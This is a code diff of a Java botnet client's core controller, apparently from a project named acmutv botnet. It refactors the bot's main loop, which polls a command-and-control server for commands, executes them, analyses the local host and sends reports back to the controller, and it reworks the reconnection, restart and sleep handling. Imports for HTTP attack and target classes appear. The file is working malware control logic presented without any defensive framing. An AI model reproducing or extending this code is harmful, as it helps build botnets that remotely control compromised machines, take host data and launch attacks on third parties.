@@ -36,6 +36,7 @@ import com.acmutv.botnet.core.attack.HttpAttack;
 import com.acmutv.botnet.core.control.Controller;
 import com.acmutv.botnet.core.control.command.BotCommand;
 import com.acmutv.botnet.core.control.command.BotCommandService;
+import com.acmutv.botnet.core.control.command.CommandScope;
 import com.acmutv.botnet.core.exception.*;
 import com.acmutv.botnet.core.pool.BotPool;
 import com.acmutv.botnet.core.report.*;
@@ -43,24 +44,21 @@ import com.acmutv.botnet.core.state.BotState;
 import com.acmutv.botnet.core.target.HttpTarget;
 import com.acmutv.botnet.tool.io.IOManager;
 import com.acmutv.botnet.tool.net.HttpMethod;
-import com.acmutv.botnet.tool.reflection.ReflectionManager;
 import com.acmutv.botnet.tool.runtime.RuntimeManager;
 import com.acmutv.botnet.tool.net.ConnectionManager;
+import com.acmutv.botnet.tool.string.TemplateEngine;
 import com.acmutv.botnet.tool.time.Duration;
 import com.acmutv.botnet.tool.time.Interval;
 import com.fasterxml.jackson.core.JsonProcessingException;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
-import java.beans.IntrospectionException;
 import java.io.IOException;
-import java.lang.reflect.InvocationTargetException;
 import java.net.SocketException;
 import java.net.UnknownHostException;
 import java.util.ArrayList;
 import java.util.List;
-import java.util.Map;
-import java.util.concurrent.ThreadLocalRandom;
+import java.util.concurrent.TimeUnit;
 
 /**
  * This class realizes the core business logic.
@@ -123,27 +121,30 @@ public class CoreController {
           break;
 
         case EXECUTION:
+          BotCommand cmd = BotCommand.NONE;
           try {
-            BotCommand cmd = getNextCommand();
-            if (cmd.equals(BotCommand.NONE)) {
-              break;
+            cmd = getNextCommand();
+            if (!cmd.getScope().equals(CommandScope.NONE)) {
+              executeCommand(cmd);
+              Report hostAnalysis = makeReport();
+              sendReport(hostAnalysis);
             }
-            executeCommand(cmd);
           } catch (BotCommandParsingException exc) {
             LOGGER.warn("Cannot read command. {}", exc.getMessage());
           } catch (BotMalformedCommandException exc) {
             LOGGER.warn("Not valid command read. {}", exc.getMessage());
           } catch (BotExecutionException exc) {
             LOGGER.warn("Cannot execute command. {}", exc.getMessage());
-          }
-
-          try {
-            Report hostAnalysis = makeReport();
-            sendReport(hostAnalysis);
           } catch (BotAnalysisException exc) {
             LOGGER.warn("Cannot analyze local host. {}", exc.getMessage());
-          } catch (BotExecutionException exc) {
-            LOGGER.warn("Cannot send report to C&C. {}", exc.getMessage());
+          } finally {
+            if (!cmd.getScope().equals(CommandScope.KILL) &&
+                !cmd.getScope().equals(CommandScope.SHUTDOWN) &&
+                !cmd.getScope().equals(CommandScope.RESTART)) {
+              try {
+                waitPolling(CONTROLLER.getPolling().getRandomDuration());
+              } catch (InterruptedException ignored) {}
+            }
           }
 
           break;
@@ -155,10 +156,6 @@ public class CoreController {
         default:
           break;
       }
-
-      try {
-        waitRandom(CONTROLLER.getPolling());
-      } catch (InterruptedException ignored) { }
     }
   }
 
@@ -200,13 +197,16 @@ public class CoreController {
         failures++;
         if (failures <= controller.getReconnections()) {
           try {
-            waitRandom(controller.getReconnectionWait());
+            LOGGER.warn("Cannot connect to C&C at {}, waiting for reconnection...", initResource);
+            waitPolling(controller.getReconnectionWait().getRandomDuration());
           } catch (InterruptedException ignored) { }
-        }
-        if (controllerId < AppConfigurationService.getConfigurations().getControllers().size()) {
-          controllerId ++;
         } else {
-          throw new BotInitializationException("Cannot load bot configuration C&C. %s", exc.getMessage());
+          if (controllerId < AppConfigurationService.getConfigurations().getControllers().size()) {
+            LOGGER.warn("Maximum number of reconnections reached for C&C at {}", initResource);
+            controllerId ++;
+          } else {
+            throw new BotInitializationException("Cannot load bot configuration C&C. %s", exc.getMessage());
+          }
         }
       }
     }
@@ -237,21 +237,12 @@ public class CoreController {
         restartBot(resource);
         break;
 
-      case UPDATE:
-        @SuppressWarnings("unchecked")
-        final Map<String,String> settings = (Map<String,String>) cmd.getParams().get("settings");
-        if (settings == null) {
-          throw new BotMalformedCommandException("Cannot execute command UPDATE: param [settings] is null");
-        }
-        updateBot(settings);
-        break;
-
       case SLEEP:
-        final Duration sleepTimeout = (Duration) cmd.getParams().get("timeout");
+        final Interval sleepTimeout = (Interval) cmd.getParams().get("timeout");
         if (sleepTimeout == null) {
           throw new BotMalformedCommandException("Cannot execute command SLEEP: param [timeout] is null");
         }
-        sleep(sleepTimeout);
+        sleep(sleepTimeout.getRandomDuration());
         break;
 
       case SHUTDOWN:
@@ -327,35 +318,17 @@ public class CoreController {
    * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
    */
   private static void restartBot(String resource) throws BotExecutionException {
-    LOGGER.traceEntry("resource={}", resource);
-    LOGGER.info("Restarting bot with resource {}...", resource);
+    LOGGER.info("Restarting bot with CC at {}...", resource);
+    AppConfiguration newConfig;
     try {
-      AppConfigurationService.load(AppConfigurationFormat.JSON, resource, null);
+      newConfig = AppConfigurationService.from(AppConfigurationFormat.JSON, resource, null);
     } catch (IOException exc) {
-      throw new BotExecutionException("Cannot restart bot. Initialization resource cannot be read. %s", exc.getMessage());
+      throw new BotExecutionException("Cannot restart bot with C&C at %s. %s", resource, exc.getMessage());
     }
-    LOGGER.traceExit();
-  }
-
-  /**
-   * Executes the command `UPDATE`.
-   * @param settings the settings to load.
-   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
-   */
-  private static void updateBot(Map<String,String> settings) throws BotExecutionException {
-    LOGGER.traceEntry("settings={}", settings);
-    LOGGER.info("Updating bot settings ...");
-    for (Map.Entry<String,String> property : settings.entrySet()) {
-      final String k = property.getKey();
-      final String v = property.getValue();
-      try {
-        ReflectionManager.set(AppConfiguration.class,
-            AppConfigurationService.getConfigurations(), k, v);
-      } catch (IntrospectionException | InvocationTargetException | IllegalAccessException exc) {
-        throw new BotExecutionException("Cannot update bot. Invalid settings found (%s to value %s).", k, v);
-      }
-    }
-    LOGGER.info("Bot settings updated");
+    freeResources(null);
+    AppConfigurationService.getConfigurations().copy(newConfig);
+    LOGGER.trace("Bot restarted with configuration {}", AppConfigurationService.getConfigurations());
+    changeState(BotState.JOIN);
     LOGGER.traceExit();
   }
 
@@ -426,7 +399,7 @@ public class CoreController {
    * @throws BotAnalysisException when local host analysis cannot be correctly executed.
    */
   public static Report makeReport() throws BotAnalysisException {
-    LOGGER.trace("Producing host analysis reports...");
+    LOGGER.trace("Producing host analysis report...");
     Report report = new SimpleReport();
     for (Analyzer analyzer : ANALYZERS) {
       final Report analysisReport = analyzer.makeReport();
@@ -451,7 +424,7 @@ public class CoreController {
       throw new BotExecutionException("Cannot serialize report. %s", exc.getMessage());
     }
     try {
-      IOManager.writeResource(logResource, json);
+      IOManager.appendResource(logResource, "\n" + json);
     } catch (IOException exc) {
       throw new BotExecutionException("Cannot communicate with C&C at %s", logResource);
     }
@@ -515,15 +488,15 @@ public class CoreController {
   }
 
   /**
-   * Make the bot sleep for random amount within the specified period.
-   * @param period the sleeping period interval.
+   * Make the bot sleep for the specified duration.
+   * @param timeout the sleeping period.
    * @throws InterruptedException when the sleeping is interrupted.
    */
-  private static void waitRandom(Interval period) throws InterruptedException {
-    final long amount =
-        ThreadLocalRandom.current().nextLong(period.getMin(), period.getMax());
-    LOGGER.trace("Waiting for {} {}", amount, period.getUnit());
-    period.getUnit().sleep(amount);
+  private static void waitPolling(Duration timeout) throws InterruptedException {
+    final long amount = timeout.getAmount();
+    final TimeUnit unit = timeout.getUnit();
+    LOGGER.info("Waiting for {} {}", amount, unit);
+    unit.sleep(amount);
   }
 
 }
